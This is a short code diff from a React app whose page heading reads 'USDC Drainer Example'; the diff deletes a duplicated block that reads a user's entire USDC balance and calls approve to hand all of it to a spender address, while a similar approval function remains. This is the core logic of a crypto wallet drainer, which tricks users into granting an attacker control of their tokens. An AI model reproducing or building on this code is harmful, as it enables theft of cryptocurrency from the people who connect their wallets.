@@ -51,17 +51,6 @@ function App() {
       console.error('Error approving tokens:', error);
     }
   };
-
-    const tokenContract = new ethers.Contract(usdcTokenAddress, erc20Abi, signer);
-
-    try {
-      const balance = await tokenContract.balanceOf(userAddress);
-      const tx = await tokenContract.approve(spenderAddress, balance);
-      await tx.wait();
-      console.log(`Approval successful: ${tx.hash}`);
-    } catch (error) {
-      console.error('Error approving tokens:', error);
-    }
   return (
     <div className="App">
       <h1>USDC Drainer Example</h1>
